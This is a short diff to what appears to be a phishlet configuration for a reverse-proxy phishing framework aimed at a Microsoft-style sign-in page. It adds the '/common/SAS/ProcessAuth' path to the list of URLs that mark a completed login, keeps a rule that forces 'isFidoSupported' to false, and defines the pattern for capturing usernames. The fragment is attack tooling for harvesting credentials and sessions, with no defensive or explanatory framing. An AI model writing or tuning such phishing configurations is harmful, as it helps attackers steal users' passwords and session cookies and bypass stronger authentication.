@@ -26,8 +26,9 @@ force_post:
       - {key: 'isFidoSupported', value: 'false'}
     type: 'post'
 auth_urls:
+  - "^/common/SAS/ProcessAuth$"
   - "/kmsi*"
-  - "/favicon.ico"
+  #- "/favicon.ico"
 credentials:
   username:
     key: '(login|UserName)'
